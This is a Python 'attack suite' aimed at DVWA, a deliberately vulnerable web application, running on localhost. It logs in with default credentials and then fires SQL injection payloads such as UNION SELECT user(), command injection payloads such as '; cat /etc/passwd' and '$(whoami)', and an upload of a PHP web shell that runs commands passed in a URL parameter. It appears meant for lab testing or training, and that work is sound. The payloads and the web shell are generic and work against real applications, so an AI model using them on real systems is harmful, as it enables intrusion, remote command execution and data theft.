#!/usr/bin/env python3
"""
Attack Script for DVWA (Damn Vulnerable Web Application)
Tests SQL Injection, Command Injection, and other attacks
"""

import requests
import time
import sys
import urllib.parse

BASE_URL = "http://localhost:8080"
LOGIN_URL = f"{BASE_URL}/login.php"

# DVWA default credentials
DVWA_USER = "admin"
DVWA_PASS = "password"

def login_dvwa():
    """Login to DVWA and return session"""
    session = requests.Session()
    
    # Get login page to get security token
    try:
        response = session.get(LOGIN_URL, timeout=5)
        if response.status_code != 200:
            print(f"[!] Failed to access login page: {response.status_code}")
            return None
        
        # Try to login
        login_data = {
            'username': DVWA_USER,
            'password': DVWA_PASS,
            'Login': 'Login'
        }
        
        response = session.post(LOGIN_URL, data=login_data, allow_redirects=False, timeout=5)
        
        if response.status_code == 302 or 'index.php' in response.text:
            print("[+] Successfully logged into DVWA")
            return session
        else:
            print("[!] Login failed, trying without authentication...")
            return session
            
    except Exception as e:
        print(f"[!] Error during login: {e}")
        return None

def sql_injection_dvwa(session):
    """Test SQL Injection on DVWA"""
    print("\n" + "="*60)
    print("SQL INJECTION ATTACK ON DVWA")
    print("="*60)
    
    # SQL Injection payloads
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "admin' --",
        "' UNION SELECT null, user() --",
        "1' OR '1'='1",
    ]
    
    # Try SQL Injection on user lookup page
    for payload in payloads:
        print(f"\n[*] Testing SQL Injection payload: {payload}")
        try:
            # Try on user lookup endpoint
            url = f"{BASE_URL}/vulnerabilities/sqli/?id={urllib.parse.quote(payload)}&Submit=Submit"
            response = session.get(url, timeout=5)
            print(f"[+] Status Code: {response.status_code}")
            
            # Check for SQL error or success indicators
            if "mysql" in response.text.lower() or "sql" in response.text.lower():
                print("[!] POTENTIAL SQL INJECTION - SQL error detected!")
            elif len(response.text) > 5000:
                print("[!] POTENTIAL SQL INJECTION - Large response received!")
            
            time.sleep(0.5)
        except Exception as e:
            print(f"[!] Error: {e}")
    
    return True

def command_injection_dvwa(session):
    """Test Command Injection on DVWA"""
    print("\n" + "="*60)
    print("COMMAND INJECTION ATTACK ON DVWA")
    print("="*60)
    
    payloads = [
        "; ls",
        "; ls -la",
        "; cat /etc/passwd",
        "; whoami",
        "| ls",
        "&& ls",
        "`whoami`",
        "$(whoami)",
    ]
    
    for payload in payloads:
        print(f"\n[*] Testing Command Injection: {payload}")
        try:
            url = f"{BASE_URL}/vulnerabilities/exec/"
            data = {
                'ip': f"127.0.0.1{payload}",
                'Submit': 'Submit'
            }
            response = session.post(url, data=data, timeout=5)
            print(f"[+] Status Code: {response.status_code}")
            
            # Check for command output indicators
            if "root" in response.text or "bin" in response.text or "etc" in response.text:
                print("[!] POTENTIAL COMMAND INJECTION - Command output detected!")
            
            time.sleep(0.5)
        except Exception as e:
            print(f"[!] Error: {e}")
    
    return True

def file_upload_dvwa(session):
    """Test File Upload vulnerability"""
    print("\n" + "="*60)
    print("FILE UPLOAD ATTACK ON DVWA")
    print("="*60)
    
    # Create a simple PHP shell
    php_shell = "<?php system($_GET['cmd']); ?>"
    
    try:
        url = f"{BASE_URL}/vulnerabilities/upload/"
        files = {
            'uploaded': ('shell.php', php_shell, 'application/x-php')
        }
        data = {
            'Upload': 'Upload'
        }
        response = session.post(url, files=files, data=data, timeout=5)
        print(f"[+] Upload attempt - Status: {response.status_code}")
        
        if "successfully uploaded" in response.text.lower():
            print("[!] FILE UPLOAD SUCCESS - Malicious file uploaded!")
        else:
            print("[*] Upload may have been blocked or failed")
    except Exception as e:
        print(f"[!] Error: {e}")
    
    return True

def main():
    print("Starting DVWA Attack Suite...")
    print(f"Target: {BASE_URL}")
    time.sleep(2)
    
    session = login_dvwa()
    if not session:
        print("[!] Could not establish session, continuing anyway...")
        session = requests.Session()
    
    # Run attacks
    sql_injection_dvwa(session)
    time.sleep(1)
    command_injection_dvwa(session)
    time.sleep(1)
    file_upload_dvwa(session)
    
    print("\n[+] DVWA attacks completed")
    return True

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)

